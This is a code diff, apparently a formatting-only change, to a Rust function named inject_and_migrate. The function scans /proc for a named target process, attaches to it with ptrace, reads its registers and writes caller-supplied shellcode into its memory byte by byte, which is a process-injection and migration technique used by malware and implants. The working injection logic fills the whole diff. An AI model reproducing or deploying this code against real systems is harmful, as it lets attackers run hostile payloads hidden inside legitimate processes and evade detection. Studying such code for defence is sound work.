@@ -6,10 +6,7 @@ use std::process::{self, Command};
 
 pub fn inject_and_migrate(shellcode: &[u8], target_process: &str) {
     // List and collect all of the PIDs of active processes
-    let list_pids = Command::new("ls")
-        .arg("/proc/")
-        .output()
-        .unwrap();
+    let list_pids = Command::new("ls").arg("/proc/").output().unwrap();
     let mut pids: Vec<i32> = String::from_utf8(list_pids.stdout)
         .unwrap()
         .split('\n')
@@ -22,12 +19,12 @@ pub fn inject_and_migrate(shellcode: &[u8], target_process: &str) {
     let mut target_pid = 0;
     for pid in pids.iter().rev() {
         let cmdline = format!("/proc/{pid}/cmdline");
-        let commandline = Command::new("cat")
-            .arg(cmdline)
-            .output()
+        let commandline = Command::new("cat").arg(cmdline).output().unwrap().stdout;
+        if String::from_utf8(commandline)
             .unwrap()
-            .stdout;
-        if String::from_utf8(commandline).unwrap().contains(target_process) && attach(Pid::from_raw(*pid)).is_ok() {
+            .contains(target_process)
+            && attach(Pid::from_raw(*pid)).is_ok()
+        {
             target_pid = *pid;
             break;
         };
@@ -45,7 +42,7 @@ pub fn inject_and_migrate(shellcode: &[u8], target_process: &str) {
     // Dump the registers for the target process
     let mut registers = match getregs(target_pid) {
         Ok(value) => value,
-        Err(error) => panic!("Could not get registers for {target_process}: {error}")
+        Err(error) => panic!("Could not get registers for {target_process}: {error}"),
     };
 
     // Copy the RIP register to a mutable variable, then increment RIP by 2
@@ -59,7 +56,8 @@ pub fn inject_and_migrate(shellcode: &[u8], target_process: &str) {
 
     // Write shellcode to target process one byte at a time
     for byte in shellcode {
-        if let Err(error) = unsafe { write(target_pid, point as *mut c_void, *byte as *mut c_void) } {
+        if let Err(error) = unsafe { write(target_pid, point as *mut c_void, *byte as *mut c_void) }
+        {
             panic!("Unable to write portion of shellcode at {byte} to {target_process}: {error}");
         }
         point += 1;
